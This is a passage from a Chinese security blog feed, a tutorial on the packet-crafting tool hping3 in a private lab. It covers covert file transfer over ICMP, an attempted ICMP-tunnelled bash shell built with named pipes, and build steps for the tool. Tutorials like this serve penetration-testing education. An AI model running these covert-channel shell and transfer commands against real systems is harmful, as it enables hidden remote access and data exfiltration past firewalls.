eth0在目标机器上执行</span><br></pre></td></tr></table></figure></p><p><img src="/img/file send.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hping3 192.168.3.38 --listen klion --icmp -I eth0 &gt; rev.txt在本地机器上执行</span><br></pre></td></tr></table></figure><p><img src="/img/file rev.png" alt=""></p><p>0x08 尝试利用hping3在目标上建立一个正向shell,暂时还有些问题,待后续解决再推上来,不过话说回来,我们的主要目的还是用它来组包,至于弹shell,比它好的方式数不胜数,何必非要用它:</p><p>在目标机器上执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mknod /tmp/in p</span><br><span class="line"># mknod /tmp/out p</span><br><span class="line"># bash &lt;/tmp/in &gt;/tmp/out 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># hping3 192.168.3.19 --listen klion -I eth0 --icmp &gt; /tmp/in &amp; </span><br><span class="line"># hping3 192.168.3.19 --sign klion -I eth0 --icmp -d 1200 --file /tmp/out &amp;</span><br></pre></td></tr></table></figure></p><p>在本地机器上执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># hping3 192.168.3.19 --listen klion -I eth0 --icmp &amp;</span><br><span class="line"># mknod /tmp/out p</span><br><span class="line"># hping3 192.168.3.19 --sign klion -I eth0 --icmp -d 1200 --file /tmp/out &amp;</span><br><span class="line"># cat &gt; /tmp/out</span><br><span class="line">  id</span><br></pre></td></tr></table></figure></p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;细心的朋友可能发现了,关于防火墙探测的部分,这里并没有提及,因为那个东西不是这么一款小工具就能搞定的,里面涉及的细节可能非常多,对于渗透来讲,也并不是非常实用,所以想想还是算了,作为基础,想必这些也差不多够用了,其实大家都看到了,工具本身并不难,难的是对tcp/ip协议栈的各个细节的理解和熟悉程度,从协议基础入手,工具自然就能游刃有余,说这款工具的主要目的还是想让大家更透彻的去理解各类端口扫描工具的底层实现细节,方便大家继续深入学习,that’s all… ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;一款经典的高级组包工具,虽然老旧,但不乏经典,你完全可以利用它任意组装专属的 tcp,udp,icmp 数据报文格式,废话不多说,咱们直奔主题…&lt;/p&gt;
&lt;p&gt;0x01 实验环境:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kali 			ip:192.168.3.38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.9 [MidLAMP] 	ip:192.168.3.16[eth1]  192.168.3.19[eth0]	在此机器上编译安装hping3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 编译安装 hping3:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# yum install libpcap-devel tcl-devel -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# wget http://www.hping.org/hping3-20051105.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# tar xf hping3-20051105.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# cd hping3-20051105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# vi bytesex.h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  || defined(__x86_64__) \	为了防止后续编译出错,需要在第一个判断下添加此句,如下图所示,添加64位系统平台&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make strip &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="hping3" scheme="https://evil-404.github.io/categories/hping3/"/>
    
    
      <category term="hping3" scheme="https://evil-404.github.io/tags/hping3/"/>
    
  </entry>
  
</feed>
